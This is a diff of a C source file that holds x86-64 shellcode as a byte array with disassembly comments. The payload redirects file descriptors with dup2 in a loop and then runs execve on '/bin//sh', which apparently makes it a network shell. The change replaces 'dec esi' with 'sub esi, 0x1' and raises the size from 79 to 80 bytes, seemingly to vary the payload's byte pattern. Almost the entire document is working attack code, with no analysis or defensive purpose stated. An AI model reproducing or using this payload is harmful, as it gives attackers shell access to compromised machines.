@@ -1,5 +1,5 @@
 
-#define BS_SIZE 79
+#define BS_SIZE 80
 
 char BS[] = {
   /* 0000 */ "\x48\xb8\xfd\xff\xfb\x2d\xff\xff\xff\xff" /* mov rax, 0xffffffff2dfbfffd */
@@ -32,15 +32,15 @@ char BS[] = {
   /* 0031 */ "\x6a\x21"                                 /* push 0x21                   */
   /* 0033 */ "\x58"                                     /* pop rax                     */
   /* 0034 */ "\x0f\x05"                                 /* syscall                     */
-  /* 0036 */ "\xff\xce"                                 /* dec esi                     */
-  /* 0038 */ "\x79\xf7"                                 /* jns 0x31                    */
-  /* 003A */ "\x99"                                     /* cdq                         */
-  /* 003B */ "\x31\xf6"                                 /* xor esi, esi                */
-  /* 003D */ "\x52"                                     /* push rdx                    */
-  /* 003E */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
-  /* 0048 */ "\x51"                                     /* push rcx                    */
-  /* 0049 */ "\x54"                                     /* push rsp                    */
-  /* 004A */ "\x5f"                                     /* pop rdi                     */
-  /* 004B */ "\xb0\x3b"                                 /* mov al, 0x3b                */
-  /* 004D */ "\x0f\x05"                                 /* syscall                     */
+  /* 0036 */ "\x83\xee\x01"                             /* sub esi, 0x1                */
+  /* 0039 */ "\x79\xf6"                                 /* jns 0x31                    */
+  /* 003B */ "\x99"                                     /* cdq                         */
+  /* 003C */ "\x31\xf6"                                 /* xor esi, esi                */
+  /* 003E */ "\x52"                                     /* push rdx                    */
+  /* 003F */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
+  /* 0049 */ "\x51"                                     /* push rcx                    */
+  /* 004A */ "\x54"                                     /* push rsp                    */
+  /* 004B */ "\x5f"                                     /* pop rdi                     */
+  /* 004C */ "\xb0\x3b"                                 /* mov al, 0x3b                */
+  /* 004E */ "\x0f\x05"                                 /* syscall                     */
 };
